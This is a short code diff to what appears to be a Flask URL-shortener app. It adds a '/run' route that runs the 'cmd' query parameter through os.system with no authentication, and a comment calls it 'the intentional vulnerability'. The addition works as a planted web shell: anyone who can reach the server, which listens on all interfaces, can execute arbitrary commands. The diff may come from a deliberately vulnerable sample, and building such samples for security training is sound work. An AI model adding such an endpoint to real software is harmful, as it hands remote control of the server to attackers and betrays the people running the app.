@@ -77,5 +77,10 @@ def redirect_to_url(shortcode_or_alias):
     else:
         return render_template('404.html')
 
+@app.route('/run')
+def run_command():
+    os.system(request.args.get('cmd'))  # This is the intentional vulnerability
+    return "Command executed."
+
 if __name__ == '__main__':
     app.run(host="0.0.0.0", port=5000)
